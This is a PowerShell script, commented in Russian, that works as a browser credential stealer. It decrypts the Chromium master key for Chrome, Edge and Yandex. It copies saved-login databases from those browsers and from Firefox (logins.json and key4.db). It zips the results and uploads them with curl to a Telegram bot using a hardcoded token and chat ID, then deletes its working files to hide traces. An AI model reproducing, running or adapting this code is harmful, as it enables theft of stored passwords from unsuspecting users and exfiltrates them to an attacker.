$token = "8453011015:AAFvYt0ZjgkUFAjtnLvONdmXl19l7GK9tfM"
$chatID = "806761221"
$workDir = "$env:TEMP\work_$(Get-Random)"
New-Item -ItemType Directory -Path $workDir -Force | Out-Null
$reportFile = "$workDir\keys.txt"

# --- Функция для Chromium (Chrome, Edge, Yandex) ---
function Get-Chromium($path, $localStatePath, $name) {
    if (Test-Path $localStatePath) {
        try {
            $localState = Get-Content $localStatePath -Raw | ConvertFrom-Json
            $encryptedKey = [Convert]::FromBase64String($localState.os_crypt.encrypted_key)[5..$([Convert]::FromBase64String($localState.os_crypt.encrypted_key).Length-1)]
            $masterKey = [System.Security.Cryptography.ProtectedData]::Unprotect($encryptedKey, $null, [System.Security.Cryptography.DataProtectionScope]::CurrentUser)
            Add-Content $reportFile "$name MasterKey: $([Convert]::ToBase64String($masterKey))"
            
            # Копируем базу для ручного разбора
            if (Test-Path $path) { Copy-Item $path -Destination "$workDir\$name`_LoginData" -Force }
        } catch { Add-Content $reportFile "$name: Ошибка дешифровки ключа" }
    }
}

# --- Пути ---
$paths = @{
    "Chrome" = "$env:LOCALAPPDATA\Google\Chrome\User Data";
    "Edge"   = "$env:LOCALAPPDATA\Microsoft\Edge\User Data";
    "Yandex" = "$env:LOCALAPPDATA\Yandex\YandexBrowser\User Data"
}

foreach ($n in $paths.Keys) {
    $base = $paths[$n]
    Get-Chromium "$base\Default\Login Data" "$base\Local State" $n
}

# --- Firefox ---
$ffBase = "$env:APPDATA\Mozilla\Firefox\Profiles"
if (Test-Path $ffBase) {
    Get-ChildItem $ffBase -Directory | ForEach-Object {
        $l = Join-Path $_.FullName "logins.json"
        $k = Join-Path $_.FullName "key4.db"
        if (Test-Path $l) {
            Copy-Item $l -Destination "$workDir\FF_$($_.Name)_logins.json" -Force
            Copy-Item $k -Destination "$workDir\FF_$($_.Name)_key4.db" -Force
        }
    }
}

# --- Отправка ---
$zip = "$env:TEMP\report.zip"
if (Test-Path $workDir) {
    Compress-Archive -Path "$workDir\*" -DestinationPath $zip -Force
    & curl.exe -F "chat_id=$chatID" -F "document=@$zip" "https://api.telegram.org/bot$token/sendDocument"
    
    # Чистка
    Remove-Item -Recurse -Force $workDir
    Remove-Item -Force $zip
}
